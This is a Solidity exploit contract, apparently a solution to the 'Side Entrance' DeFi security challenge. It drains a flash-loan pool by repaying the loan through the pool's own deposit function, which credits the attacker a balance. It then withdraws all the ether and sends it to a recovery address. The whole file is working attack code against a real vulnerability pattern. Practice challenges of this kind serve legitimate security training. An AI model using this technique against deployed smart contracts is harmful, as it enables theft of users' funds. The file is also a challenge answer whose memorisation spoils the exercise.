pragma solidity ^0.8;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
import "forge-std/console.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract Exploit is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;
    address public recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function executeFlashLoan(uint256 amount) external {
        pool.flashLoan(amount); // take out the flash loan

        pool.withdraw();

        uint256 balance = address(this).balance;
        (bool sent, ) = recovery.call{value: balance}("");

        require(sent, "Transaction failed");
    }

    function execute() external payable override {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
